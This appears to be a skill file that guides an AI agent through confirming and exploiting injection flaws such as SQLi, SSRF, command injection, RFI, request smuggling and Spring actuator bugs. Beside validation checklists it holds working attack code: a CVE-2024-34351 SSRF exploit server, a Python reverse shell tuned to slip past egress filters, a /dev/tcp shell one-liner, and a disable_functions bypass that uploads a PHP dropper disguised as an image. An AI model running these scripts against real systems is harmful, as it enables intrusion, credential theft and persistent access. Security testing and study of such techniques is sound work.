---
name: injection-reproduce
description: SQLi, NoSQLi, SSRF, XXE, SSTI, CMDi, LFI, RFI, deserialization, smuggling, cache poisoning, disable_functions bypass. After HUNT confirms exploitable — confirmation, PoC creation, exploit adaptation. Use when testing INJECTION vulnerabilities.
---

# SKILL-INJECTION-REPRODUCE — Injection Vulnerabilities — Reproduce
# Phase Coverage: 3-4, 7-10, 10.1, 16-19, 22-24, 31-32, 38, 40-41
# Vuln Classes: SQLi, NoSQLi, SSRF, XXE, SSTI(inc. VTL/API Gateway), CMDi, LFI, RFI,
#               Deserialization(PHP/Java/Python chains), File Upload(inc. ImageMagick),
#               Smuggling, Cache Poisoning, CRLF, HPP, GraphQL, LDAP, XPath,
#               disable_functions Bypass (Chankro LD_PRELOAD)
# Purpose: Injection vulnerability confirmation, PoC development, chain planning, validation
# v3.3 HOOKS: Observation Gate (dom_analyzer mandatory before confirming), Payload Mutator (deterministic PoC)

---

## v3.3 Observation Gate — MANDATORY Before Confirming ANY Finding

```
HUNT → REPRODUCE TRANSITION GATE (v3.3):
  → The dom_analyzer.py result MUST show structural_divergence_detected: true
    before transitioning from HUNT to REPRODUCE for any injection finding.
  → This gate is NON-NEGOTIABLE. No manual plain-text comparison accepted.
  → All REPRODUCE-phase PoC scripts must cite the dom_analyzer result.

  python3 mcp/dom_analyzer.py --control <baseline> \
      --true-condition <injected_response> --false-condition <inert_response>
  Or via MCP: dom_analyze { control, true_condition, false_condition }

PAYLOAD MUTATION FOR PoC (v3.3):
  → Deterministic reproduction: python3 mcp/payload_mutator.py --seed "<working_payload>" --all
  → The same seed + strategy ALWAYS produces the same output — PoC is 100% reproducible.
```

---

## Phase 3: SQL Injection (SQLi) — CIA: C:H I:H A:M

### SUB-PHASE 3.3: REPRODUCE

**Confirm:** real data extraction or authentication bypass, not just error
**PoC Script:** save to scripts/{SLUG}/sqli_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/sqli/{title}/

**CHAIN OUTPUT:**
  → SQLi error-based (low) + union-based data read → C:H chain (credentials dump)
  → SQLi + file write (INTO OUTFILE) → shell upload → RCE (critical)
  → SQLi + stacked queries → admin password change → ATO (critical)

---

## Phase 4: NoSQL Injection — CIA: C:H I:H

### SUB-PHASE 4.3: REPRODUCE

**Confirm:** actual auth bypass (not just type confusion), data extraction from another user, or operator execution.
**PoC Script:** save to scripts/{SLUG}/nosqli_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/nosql-injection/{title}/

**Validation Checklist:**
```
□ Does the $ne/$gt operator bypass return data for a different user?
□ Is the injection in the auth flow (login bypass)? → CRITICAL
□ Is the injection in a search/filter endpoint? → data exposure → HIGH
□ Does $where with sleep() cause a measurable time delay? (timing = confirmed injection)
□ Does $accumulator execute arbitrary JS? → RCE → CRITICAL
□ BSON type confusion: does passing int instead of string match documents?
□ Can you extract data field-by-field via $regex blind injection?
```

**FALSE POSITIVE CHECK:**
```
- 200 OK with empty response = operator rejected, not bypassed → NOT VULNERABLE
- App uses Mongoose with strict schemas → type confusion may NOT work
- $where disabled in MongoDB 4.4+ by default → check server version
- Error message reveals query structure but doesn't execute → INFO DISCLOSURE, not NoSQLi
```

**CHAIN OUTPUT:**
  → NoSQLi auth bypass (critical) → full account access → ATO with no credentials (critical)
  → NoSQLi $regex extraction (high) → mass user enumeration → PII dump (critical)
  → NoSQLi $accumulator RCE (critical) → shell on DB server → full infrastructure compromise (critical)
  → NoSQLi + exposed API keys in DB → cloud credential theft (critical)

---

## Phase 7: SSRF — CIA: C:H I:H

### SUB-PHASE 7.3: REPRODUCE

**Confirm:** actual request to internal/attacker-controlled host, not just URL validation bypass.
**PoC Script:** save to scripts/{SLUG}/ssrf_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/ssrf/{title}/

**Validation Checklist:**
```
□ Does the collaborator/interactsh receive a DNS/HTTP interaction?
□ Can you reach internal IPs: 127.0.0.1, 10.x, 172.16-31.x, 192.168.x?
□ Can you reach cloud metadata endpoints? (169.254.169.254, metadata.google.internal)
□ Does the response contain data from the internal host (not just connection)?
□ Can you read cloud IAM credentials from metadata? → CRITICAL
□ Can you interact with internal services? (Redis, Elasticsearch, Consul, K8s API)
□ Does gopher:// or dict:// protocol work? → RCE potential
□ Does the SSRF work on POST/PUT (not just GET)?
```

**FALSE POSITIVE CHECK:**
```
- Collaborator hit but from a different IP (CDN/WAF health check) → NOT SSRF
- Only http:// allowed, no file:// or gopher:// → limited SSRF, lower severity
- Internal IP returns timeout (blocked at network level) → NOT VULNERABLE
- Response shows "Invalid URL" but no request made → URL validation, not SSRF
- Metadata endpoint hit but requires IMDSv2 token → test token acquisition path
```

### NextJS SSRF Confirmation (CVE-2024-34351 / `_next/image`)

```
SOURCE: raw/SSRF.md — Assetnote, CVE-2024-34351
SURFACES:
  A. _next/image + ** wildcard → blind SSRF (HIGH)
  B. _next/image + open redirect chain → blind SSRF (HIGH)
  C. Server Actions + Host header → FULL READ SSRF (CRITICAL)
```

**Surface A — `_next/image` Blind SSRF Confirmation:**
```bash
# Confirm OAST callback
# oast_poll should show DNS/HTTP interaction from target server IP
python3 mcp/oast_manager.py --action poll --correlation-id "nextjs_ssrf_image"

# OR manually verify via internal service response reflection
# (only works if internal response has image/* Content-Type or old NextJS + XML)
```

**Surface B — Open Redirect Chain Confirmation:**
```bash
# Confirm that redirects are followed by _next/image
# Set up redirect chain: your URL → whitelisted open redirect → your collaborator
# Then check collaborator for the final request
python3 mcp/oast_manager.py --action poll --correlation-id "nextjs_ssrf_redirect"
```

**Surface C — Server Actions Full Read SSRF Confirmation:**
```
□ Did the Flask exploit server receive a HEAD request from the target?
□ Did the HEAD request contain Content-Type: text/x-component in the response?
□ Did the target then make a GET request (following 302 redirect)?
□ Does the response body contain the SSRF target's content?
□ Is IAM metadata readable? → CRITICAL (cloud account takeover)
□ Is internal service data readable? (K8s API, Redis, Elasticsearch)
□ Does the OAST callback confirm blind interaction?

FALSE POSITIVE CHECK:
  - HEAD response with text/x-component not sent → server may not follow GET
  - 302 redirect not followed by NextJS → blocked by CURLOPT_FOLLOWLOCATION config
  - Host header validated/blocked by reverse proxy → CVE-2024-34351 not exploitable
  - No Server Actions found in JS → CVE not applicable to this target
  - action redirects to absolute URL (https://...) not relative (/) → not vulnerable
```

**Flask Exploit Server PoC (reusable):**
```bash
# Save to scripts/{SLUG}/cve-2024-34351_exploit_server.py
cat > /tmp/cve-2024-34351_exploit_server.py << 'PYEOF'
#!/usr/bin/env python3
"""
CVE-2024-34351 — NextJS Server Actions SSRF Exploit Server
Usage: python3 cve-2024-34351_exploit_server.py <ssrf_target>
Example: python3 cve-2024-34351_exploit_server.py http://169.254.169.254/latest/meta-data/
"""
from flask import Flask, Response, request, redirect
import sys, logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.INFO)
SSRF_TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:9200/"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        print(f"[HEAD] → {request.remote_addr} (returning text/x-component)")
        return resp
    print(f"[GET] → {request.remote_addr} (redirecting to {SSRF_TARGET})")
    return redirect(SSRF_TARGET)

if __name__ == '__main__':
    print(f"[*] CVE-2024-34351 Exploit Server")
    print(f"[*] SSRF target: {SSRF_TARGET}")
    print(f"[*] Listening on 0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080)
PYEOF
```

**Validation Checklist (NextJS SSRF):**
```
□ Does _next/image return HTTP 200? → endpoint exists
□ Does _next/image accept external URLs? → check HTTP:200 vs 400/403
□ Are remotePatterns wildcard **? → check next.config.js or probe
□ Is open redirect chain exploitable? (redirect from whitelisted domain)
□ Are Server Actions present in JS bundles? (grep for "use server")
□ Does any action redirect to /relative-path? (login guard, error handler)
□ Can Host header be forged? (no Host validation at reverse proxy)
□ Does Flask exploit server receive HEAD request from target? → SSRF confirmed
□ Does GET request follow redirect to metadata/internal target? → FULL READ
```

**Chain Output (NextJS SSRF additions):**
```
→ Server Actions SSRF (CVE-2024-34351) → IAM credentials → CLOUD ACCOUNT TAKEOVER (critical)
→ Server Actions SSRF + K8s metadata → service account token → container escape (critical)
→ _next/image blind SSRF + wildcard → internal port scan → service discovery (high)
→ _next/image + XML reflection (old NextJS) → full internal API read (critical)
→ _next/image + open redirect chain → bypass allowlist → internal access (high)
```

**CHAIN OUTPUT:**
  → SSRF to metadata (critical) → IAM credentials → cloud account takeover (critical)
  → SSRF to internal API (high) → internal data access → lateral movement (critical)
  → SSRF to Redis/Memcached (high) → cache manipulation → RCE or data corruption (critical)
  → SSRF + gopher:// → protocol smuggling → RCE on internal services (critical)
  → SSRF to K8s API → pod/service account token → container escape chain (critical)
  → Blind SSRF (medium) + internal service discovery → targeted attack chain (high)

---

## Phase 8: XXE — CIA: C:H I:M

### SUB-PHASE 8.3: REPRODUCE

**Confirm:** actual file contents returned, SSRF fired, or DoS triggered (note only).
**PoC Script:** save to scripts/{SLUG}/xxe_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/xxe/{title}/

**Validation Checklist:**
```
□ Does /etc/passwd or /etc/hostname content appear in the response? → C:H
□ Does the collaborator receive a request from the target server? → SSRF via XXE
□ Does parameter entity + error-based exfil work? (blind XXE)
□ Does XInclude work when DOCTYPE is blocked?
□ Does SVG upload XXE work when XML content-type is rejected?
□ Can you read application source/config files? (.env, web.config, application.properties)
□ Does billion laughs cause measurable delay? (note only — DoS, do not actively exploit)
```

**FALSE POSITIVE CHECK:**
```
- XXE payload returned literally (not parsed) → XML parser not processing entities → NOT VULNERABLE
- "DOCTYPE not allowed" error → parser configured to disallow → properly hardened
- External entity loads but only from allowlisted hosts → limited, lower severity
- File read returns "permission denied" → parser works but file not readable → MEDIUM (try other files)
```

**CHAIN OUTPUT:**
  → XXE file read (high) → source code/config → discover more vulnerabilities (critical chain)
  → XXE file read (high) → cloud metadata → IAM credentials (critical)
  → XXE SSRF (high) → internal services → lateral movement (critical)
  → SVG XXE (medium) + stored file = persistent data extraction (high)
  → Blind XXE (medium) + out-of-band = data exfiltration channel (high)

---

## Phase 9: SSTI — CIA: C:H I:H A:H

### SUB-PHASE 9.4: API GATEWAY VTL RCE — Confirmation

**ANALYSIS - CONFIRM IF REAL:**
```
- Template stored and retrieved? (HTTP 200 on PUT)
- VTL directives executed server-side? (not echoed back literally)
- Command executed? (marker file created or process output in response)
- Java reflection available? ($util.getClass() resolves)
- IAM enforcement disabled or bypassable?

FALSE POSITIVE CHECK:
  - VTL echoed back = template NOT evaluated -> NOT VULNERABLE
  - 403 on PUT = IAM blocks -> test IAM bypass path
  - Template truncated = WAF filtering -> try encoding variants
```

---

## Phase 10: Command Injection (CMDi) — CIA: C:H I:H A:H

### SUB-PHASE 10.3: REPRODUCE

**Confirm:** actual command execution output returned or out-of-band callback received.
**PoC Script:** save to scripts/{SLUG}/cmdi_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/command-injection/{title}/

**Validation Checklist:**
```
□ Does sleep/wait payload cause measurable time delay? (>3s baseline deviation)
□ Does the response contain command output? (id, whoami, hostname)
□ Does the collaborator receive a callback? (curl/wget to collaborator URL)
□ Can you write a marker file? (echo > /tmp/marker, confirm via another vector)
□ Does the injection work with spaces bypassed? ($IFS, {cmd,args}, tab chars)
□ Does the injection work through multiple encoding layers?
□ Is the injection blind (no output) or visible (output in response)?
```

**FALSE POSITIVE CHECK:**
```
- 5s delay from network latency, not sleep command → NOT CMDi (compare with baseline timing)
- Command output is from client-side rendering of user input → NOT server-side CMDi
- Payload reflected but not executed → STORED/REFLECTED only, not CMDi
- WAF blocks common separators — test space/keyword bypass before declaring dead
```

**CHAIN OUTPUT:**
  → CMDi (critical standalone) → shell on server → full compromise (critical)
  → CMDi → read application config (.env, DB creds) → data exfiltration (critical)

**Post-Exploitation — Python Reverse Shell PoC Template:**
Use when a command injection is confirmed and outbound TCP (port 443) is reachable. This
Python 3 reverse shell uses raw sockets + dup2 fd redirection + interactive shell session.
Save to scripts/{SLUG}/reverse_shell_<target-ip>.sh and deploy after cmd injection confirmed.
```bash
#!/bin/bash
# Python reverse shell PoC — confirmed CMDi post-exploitation payload
# Usage: ./reverse_shell.sh <LHOST> <LPORT=443>
LHOST="${1:-10.0.0.1}"
LPORT="${2:-443}"

python3 -c '
import sys, os, socket, subprocess

HOST = "'"$LHOST"'"
PORT = int("'"$LPORT"'")

# TCP connection — blend with HTTPS traffic on port 443
s = socket.socket(socket.PF_INET, socket.SOCK_STREAM)
s.settimeout(30)
keepalive = 1  # SO_KEEPALIVE

try:
    s.connect((HOST, PORT))
except (socket.timeout, ConnectionRefusedError, OSError):
    sys.exit(1)

# Redirect stdin/stdout/stderr to socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Interactive shell session
subprocess.call(["/bin/sh", "-i"])
'
```

**Listener-side (attacker):**
```bash
# Terminal 1: catch the callback
nc -lvnp 443
```

**Validation:**
```
□ Can you read /etc/passwd from the shell? → code execution confirmed
□ Can you write a file to /tmp/? → write capability confirmed
□ Can you ping back to your collaborator? → outbound traffic confirmed
□ Is it a persistent session or one-shot command? → shell type identified
```

**Port 443 Rationalization:**
HTTPS (TCP 443) is the safest outbound port — most egress filters allow it. If 443 is
blocked, try 80 (HTTP), 53 (DNS — though raw TCP on 53 is unusual), 22 (SSH), or
8443 (HTTPS alt). For DNS tunneling alternative, use tcpdump/tshark on the listener
to verify which ports are actually reachable.
  → CMDi → write SSH key → persistent access (critical)
  → CMDi + internal network access → lateral movement → infrastructure compromise (critical)
  → Blind CMDi (high) + OOB exfiltration = data extraction channel (critical)

---

## Phase 10.1: PHP disable_functions Bypass — CIA: C:H I:H A:H

### SUB-PHASE 10.1.3: REPRODUCE

**Confirm:** actual command execution achieved despite disable_functions restriction
**PoC Script:** save to scripts/{SLUG}/disable_functions_bypass_{surface}.sh

**Reproduction Checklist:**
```
□ Uploaded shared object (.so) successfully to /tmp/ or writable directory
□ PHP dropper correctly sets CHANKRO_CMD, CHANKRO_OUT, LD_PRELOAD environment variables
□ mail() triggers sendmail which loads the malicious .so via LD_PRELOAD
□ Command output captured and displayed in HTTP response
□ No PHP warnings/errors that would indicate the bypass failed
```

**Clean PoC Script Template:**
```bash
#!/bin/bash
# disable_functions_bypass.sh — Chankro LD_PRELOAD Bypass
# Target: {TARGET_URL}
# PHP: {PHP_VERSION}, SAPI: {SAPI}
# Disabled: {DISABLED_FUNCTIONS}
# Available: putenv=YES, mail=YES

TARGET="{TARGET_URL}"
UPLOAD_ENDPOINT="{UPLOAD_ENDPOINT}"
ATTACKER_IP="{ATTACKER_IP}"
PORT=4444

echo "[*] Step 1: Compile Chankro shared object"
cat > /tmp/chankro.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("CHANKRO_CMD");
    char *out = getenv("CHANKRO_OUT");
    if (cmd) {
        FILE *fp = fopen(out ? out : "/tmp/output.txt", "w");
        FILE *pipe = popen(cmd, "r");
        if (fp && pipe) {
            char buf[4096]; size_t n;
            while ((n = fread(buf, 1, sizeof(buf), pipe)) > 0)
                fwrite(buf, 1, n, fp);
            pclose(pipe); fclose(fp);
        }
    }
}
CEOF
gcc -shared -fPIC -o /tmp/chankro.so /tmp/chankro.c
echo "[+] Compiled chankro.so: $(ls -la /tmp/chankro.so)"

echo "[*] Step 2: Create PHP dropper"
cat > /tmp/dropper.php << 'PEOF'
<?php
$b64 = "BASE64_ENCODED_CHANKRO_SO";
file_put_contents('/tmp/chankro.so', base64_decode($b64));
chmod('/tmp/chankro.so', 0777);
putenv("CHANKRO_CMD=id");
putenv("CHANKRO_OUT=/tmp/output.txt");
putenv("LD_PRELOAD=/tmp/chankro.so");
mail("a@b.com", "", "");
usleep(200000);
echo "OUTPUT:" . file_get_contents('/tmp/output.txt');
?>
PEOF

echo "[*] Step 3: Upload dropper"
curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
  -F "file=@/tmp/dropper.php;filename=shell.php;type=image/jpeg" \
  -o /tmp/upload_resp.txt -w "HTTP:%{http_code}\n"
cat /tmp/upload_resp.txt

echo "[*] Step 4: Trigger bypass"
curl -sk "$TARGET/uploads/shell.php" | grep -oE "OUTPUT:.*" | head -1

echo "[*] Step 5: Verify RCE"
OUTPUT=$(curl -sk "$TARGET/uploads/shell.php?cmd=id" | grep -oE "uid=.*")
if [[ "$OUTPUT" == *"uid="* ]]; then
  echo "[+] BYPASS CONFIRMED — CIA:C:H I:H"
  echo "[+] Output: $OUTPUT"
else
  echo "[-] Bypass failed — check upload path and LD_PRELOAD"
fi
```

**Validation Checklist (after successful bypass):**
```
□ Command execution works with id, whoami, uname -a
□ Can read flag files: cat /flag.txt, cat /home/*/user.txt
□ Can write files: echo "test" > /tmp/test.txt
□ Can establish reverse shell: bash -i >& /dev/tcp/{ATTACKER}/{PORT} 0>&1
□ Can access network: curl http://127.0.0.1/internal-service
```

**False Positive Checks:**
```
□ Does /tmp/chankro.so actually exist on target after upload?
□ Does mail() return true (not false/null)?
□ Is the output actually from command execution (uid= pattern) not a PHP warning?
□ Can you reproduce the bypass multiple times consistently?
```

**CHAIN OUTPUT:**
  → disable_functions bypass (critical) → full shell access → read all flags
  → disable_functions bypass + reverse shell → persistent access → privesc
  → disable_functions bypass + network access → internal service exploitation

---

## Phase 16: Insecure Deserialization -- CIA: C:H I:H A:H

### SUB-PHASE 16.3: REPRODUCE

**Confirm:** actual code execution or data access, not just class instantiation
**PoC:** save working chain to scripts/{SLUG}/deserialization_{surface}.sh
**Chain Output:**
  - Deserialization + RCE chain = CRITICAL (full server compromise)
  - Deserialization + file read = HIGH (source/config disclosure)
  - Deserialization + SSRF = MEDIUM (internal network access)

---

## Phase 17: File Upload -- CIA: C:H I:H A:H

### SUB-PHASE 17.4: IMAGEMAGICK GHOSTSCRIPT DELEGATE HIJACK — Confirmation

**ANALYSIS - CONFIRM IF REAL:**
```
  - ImageMagick delegates.xml uses bare executable name? (no absolute path)
  - Upload directory = conversion CWD? (planted exe gets launched)
  - Ghostscript delegate triggered? (PDF/PS/EPS conversion)
  - Planted exe executed? (marker or outbound connection received)

MITIGATION:
  - Set MAGICK_GHOSTSCRIPT_PATH to absolute Ghostscript bin directory
  - Configure delegates.xml with absolute paths
  - Run conversion from trusted directory separate from uploads
  - Disable PDF/PS delegates if not required
```

---

## Phase 18: Path Traversal / LFI — CIA: C:H

### SUB-PHASE 18.4: FILE UPLOAD FILENAME PATH TRAVERSAL → LFI — Confirmation

**Analysis — Confirm If Real:**
```
□ Does the upload endpoint return a URL to the stored file?
□ Does the returned URL contain the original filename?
□ Do ../ sequences in filename traverse directories?
□ Can you read /etc/passwd or other system files?
□ Is the file content the SERVER's file (not your uploaded content)?
□ Does the server error message reveal internal paths?

FALSE POSITIVE CHECK:
  - Only your uploaded content returned = filename NOT used for storage → NOT VULNERABLE
  - 400/403 on traversal = filter in place → test bypass variants
  - File stored with sanitized name (hash) = filename NOT used → NOT VULNERABLE
  - CDN transforms filename = stored but sanitized → test other upload endpoints
```

---

## Phase 19: RFI — CIA: C:H I:H A:H

### SUB-PHASE 19.3: REPRODUCE

**Pre-condition:** `allow_url_include=On` in php.ini (verify via LFI of /proc/self/environ or phpinfo output).

**Confirm:** remote PHP file executes on the target server.
**PoC Script:** save to scripts/{SLUG}/rfi_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/rfi/{title}/

**Validation Checklist:**
```
□ Does the target fetch and execute your hosted PHP file?
□ Does command output appear in the response? (id, whoami, uname -a)
□ Is allow_url_include confirmed On via phpinfo or /proc/self/environ?
□ Does the server connect back to your listener on a different protocol? (ftp://, data://)
□ Can you use php://input with POST body for code execution? (alternative RFI vector)
```

**FALSE POSITIVE CHECK:**
```
- allow_url_include=Off → NOT exploitable via HTTP/FTP → log as DEAD_END
- Server reaches out but doesn't execute (downloads only) → SSRF, not RFI
- URL is validated to local paths only → LFI only, not RFI
```

**CHAIN OUTPUT:**
  → RFI (critical standalone) → shell on server → full compromise (critical)
  → RFI + LFI to confirm allow_url_include → combined PoC (critical)
  → RFI → write webshell → persistent access (critical)

---

## Phase 22: HTTP Request Smuggling — CIA: C:H I:H

### SUB-PHASE 22.3: REPRODUCE

**Confirm:** smuggled request causes victim's request to be answered by attacker-controlled content, or smuggled prefix poisons subsequent requests.
**PoC Script:** save to scripts/{SLUG}/smuggling_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/request-smuggling/{title}/

**Validation Checklist:**
```
□ Does the smuggled prefix cause a 404/error on the next legitimate request? → CL.TE or TE.CL confirmed
□ Does the smuggled request return content from a different endpoint? → confirmed
□ Can you poison the next user's response with attacker-controlled content? → C:H
□ Does TE.TE obfuscation work when standard chunked is blocked?
□ Can you capture another user's request body via smuggled prefix? → C:H (session hijack)
□ Is HTTP/2 downgrade smuggling possible? (frontend HTTP/2, backend HTTP/1.1)
```

**FALSE POSITIVE CHECK:**
```
- Single request succeeds but next request unchanged → NOT smuggling (normal behavior)
- WAF/CDN normalizes both CL and TE → smuggling neutralized
- Backend rejects chunked encoding → TE not supported → CL.TE not possible
- Only works on your own requests (no user impact) → MEDIUM at best, confirm multi-user
```

**CHAIN OUTPUT:**
  → Smuggling (high) + victim request hijack = session cookie theft (critical)
  → Smuggling (high) + cache poison = persistent XSS for all users (critical)
  → Smuggling + admin endpoint = admin action on behalf of victim (critical)
  → Smuggling + WAF bypass = reach internal-only vulnerable endpoints (high→critical)

---

## Phase 23: Web Cache Poisoning — CIA: C:H I:H

### SUB-PHASE 23.3: REPRODUCE

**Confirm:** unkeyed header/value persists in cache and serves poisoned content to other users.
**PoC Script:** save to scripts/{SLUG}/cache-poisoning_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/cache-poisoning/{title}/

**Validation Checklist:**
```
□ Does the unkeyed header value appear in the cached response?
□ Does the poisoned response persist beyond your session? (test via second request)
□ Is the X-Cache header showing "HIT" for poisoned content?
□ Can you inject XSS via unkeyed headers? (X-Forwarded-Host: "><script>...)
□ Can you poison a resource used across pages? (JS/CSS → site-wide impact)
□ Does the CDN cache based on unkeyed query parameters? (fat GET)
□ Can you override error pages? (404 cache poisoning → persistent defacement)
```

**FALSE POSITIVE CHECK:**
```
- Header reflected but not cached (X-Cache: MISS on second request) → NOT POISONED
- Only reflected in your own response (no multi-user impact) → LOW at best
- CDN strips the header before caching → properly sanitized
- Cache key includes the header → header is KEYED, not exploitable
```

**CHAIN OUTPUT:**
  → Cache poison XSS (high) → persistent XSS for all users → mass cookie theft (critical)
  → Cache poison + JS resource = persistent backdoor in every visitor's browser (critical)
  → Cache poison + login page redirect = credential harvesting (critical)
  → Cache poison + cookie injection = session fixation at scale (critical)

---

## Phase 24: Web Cache Deception — CIA: C:H

### SUB-PHASE 24.3: REPRODUCE

**Confirm:** authenticated sensitive content cached under static-looking URL and served to unauthenticated attacker.
**PoC Script:** save to scripts/{SLUG}/cache-deception_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/cache-deception/{title}/

**Validation Checklist:**
```
□ Does /sensitive/endpoint.css return the same content as /sensitive/endpoint?
□ Is the response cached? (CDN treats .css as static, caches auth content)
□ Can you retrieve the cached sensitive content without authentication?
□ Does the cached content contain PII, tokens, or account data?
□ Does the delimiter work with other extensions? (.js, .png, .ico, .woff, .jpg)
□ Does cache deception work with ; delimiter? (/account;.css)
```

**FALSE POSITIVE CHECK:**
```
- Server returns 404 for .css extension → path doesn't exist → NOT VULNERABLE
- Cached response is the same for auth and unauth users (public content) → NOT VULNERABLE
- CDN does not cache by default / cache busted → not exploitable in practice
- Content contains only generic HTML, no user data → LOW at best
```

**CHAIN OUTPUT:**
  → Cache deception (high) → PII in cached content = mass data leak (critical)
  → Cache deception + CSRF token in cached response = CSRF bypass (high)
  → Cache deception + API key in cached response = API abuse (critical)

---

## Phase 31: HTTP Parameter Pollution (HPP) — CIA: I:M

### SUB-PHASE 31.3: REPRODUCE

**Confirm:** duplicate parameters cause backend behavior change (WAF bypass, logic override, or auth manipulation).
**PoC Script:** save to scripts/{SLUG}/hpp_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/http-parameter-pollution/{title}/

**Validation Checklist:**
```
□ Does duplicate param bypass WAF? (WAF sees safe param, backend sees malicious)
□ Does duplicate param change application logic? (role=user&role=admin → admin)
□ Does the attack work on state-changing endpoints? (POST/PUT with duplicate body params)
□ Is the framework determined? (PHP=last, Node=array, ASP.NET=comma, Flask=first)
□ Can HPP enable SQLi/XSS where single param is blocked?
□ Does parameter pollution work on array params? (items[]=1&items[]=DROP)
```

**FALSE POSITIVE CHECK:**
```
- Both params honored with no security impact → framework behavior confirmed, NOT exploitable
- WAF and backend use same parameter parsing → HPP doesn't help
- Requires specific framework knowledge not obtainable → unconfirmed
```

**CHAIN OUTPUT:**
  → HPP WAF bypass (medium) + SQLi behind WAF → data extraction (critical)
  → HPP auth bypass (high) → role escalation → admin access (critical)
  → HPP + payment flow = price/recipient manipulation (critical)

---

## Phase 32: GraphQL Security — CIA: C:H I:H

### SUB-PHASE 32.3: REPRODUCE

**Confirm:** introspection reveals hidden types, alias batching bypasses rate limits, or nested queries bypass authorization.
**PoC Script:** save to scripts/{SLUG}/graphql_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/graphql/{title}/

**Validation Checklist:**
```
□ Does introspection return full schema? (types, fields, mutations, subscriptions)
□ Are there hidden/deprecated fields in schema? (admin*, internal*, debug*, migrate*)
□ Does alias batching allow 50+ mutations in one request? → rate limit bypass
□ Can you traverse from public type to private type via nested query? → auth bypass
□ Does the schema expose sensitive fields? (password, token, ssn, apiKey, secret)
□ Are there dangerous mutations? (delete*, drop*, truncate*, execute*, sudo*)
□ Does the field suggestions error reveal hidden field names?
□ Is GraphiQL exposed? → interactive schema exploration (HIGH)
□ Global ID (GID) BOLA/IDOR: decode base64 ID → increment → re-encode → test access
□ Operation name auth bypass: allowed op name + protected field in same query
□ Introspection regex bypass: newline/space after __schema, GET method, URL encoding
□ Array-based batch: JSON array body → all operations processed → rate limit bypass?
□ WebSocket subscription auth: connect with empty/invalid token → subscribe to sensitive events
□ CSWSH: WebSocket upgrade with custom Origin → if 101 → hijack subscriptions
□ Spring GraphQL deserialization (CVE-2026-41699): crafted pagination cursor → RCE
□ Query complexity DoS: deep nesting (5+ levels), fragment bombs, circular references
```

**FALSE POSITIVE CHECK:**
```
- Introspection disabled → properly hardened (but test field suggestion leak)
- Alias batching returns rate-limit error → protection in place
- Nested query returns "unauthorized" → proper field-level auth
- Schema exposes only public types → well-designed API
- WebSocket returns 403 on upgrade → origin check enforced
- GID access returns "not found" → may be deleted, test adjacent IDs
```

**CHAIN OUTPUT:**
  → GraphQL introspection (medium) + IDOR on mutation = mass data modification (critical)
  → Alias batching (medium) + brute force = credential stuffing at scale (high)
  → Nested auth bypass (high) → admin data via public query = privilege escalation (critical)
  → Dangerous mutations (critical standalone) → DB drop, user delete (critical)
  → GraphiQL exposed (medium) + introspection = complete API attack surface map (high)
  → GID BOLA (high) + sequential IDs = full data enumeration (critical)
  → WebSocket subscription bypass (high) + PII = real-time data exfiltration (critical)
  → CSWSH (high) + session tokens = account takeover (critical)
  → Spring GraphQL deserialization (critical) = RCE via pagination cursor

## Phase 46: Spring Boot Actuator — CIA: C:H I:H A:H

### SUB-PHASE 46.3: REPRODUCE

**Confirm:** actuator endpoints accessible without auth, or CVE-2026-40976/22731/22733 confirmed.
**PoC Script:** save to scripts/{SLUG}/spring-boot-actuator_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/spring-boot-actuator/{title}/

**Validation Checklist:**
```
□ Framework auth bypass (CVE-2026-40976): /actuator/env, /actuator/heapdump reachable without auth
□ Custom endpoint bypass: /api/admin or other protected paths accessible without auth
□ Health group bypass (CVE-2026-22731): /healthz/admin or subpaths accessible
□ CloudFoundry bypass (CVE-2026-22733): /cloudfoundryapplication/admin accessible
□ Env modification: POST /actuator/env returns 200, property updated
□ Jolokia RCE: /actuator/jolokia/list shows reloadByURL MBean
□ Gateway SSRF: /actuator/gateway/routes returns 200, route creation possible
□ Heapdump secrets: download /actuator/heapdump, extract with strings/MAT
□ Log level manipulation: POST /actuator/loggers with TRACE level, read logfile for creds
□ Spring Cloud Config: Eureka XStream deserialization → RCE chain
□ H2 Database: /actuator/env + /actuator/restart + CREATE ALIAS → RCE
□ Version range: check affected versions (2.7.0–4.0.5 depending on CVE)
```

**FALSE POSITIVE CHECK:**
```
- /actuator/health returns 200 → health is often unauthenticated by design
- /actuator/info returns 200 → info is often unauthenticated by design
- Heapdump download blocked → network-level restriction, not auth
- Jolokia returns 404 → dependency not present, not vulnerable
- Gateway routes returns 403 → auth properly configured
- Loggers returns 400 → endpoint disabled
```

**CHAIN OUTPUT:**
  → Actuator env + Spring Cloud Config = Eureka XStream RCE (critical)
  → Jolokia + reloadByURL + LDAP = JNDI RCE (critical)
  → Gateway routes + metadata = SSRF → IAM creds → cloud account takeover (critical)
  → Heapdump + credential extraction = backend access (high)
  → Log level TRACE + logfile = credential harvesting (high)
  → CVE-2026-40976 + any protected endpoint = full unauthorized access (critical)
  → Health group bypass + admin subpath = privilege escalation (high)
  → CloudFoundry bypass + internal APIs = unauthorized access (high)

---

## Phase 38: CRLF Injection & Header Injection — CIA: I:M (base) → chains to C:H I:H

### SUB-PHASE 38.3: REPRODUCE

**Confirm:** injected headers appear in response or HTTP response splitting occurs.
**PoC Script:** save to scripts/{SLUG}/crlf_{surface}.sh
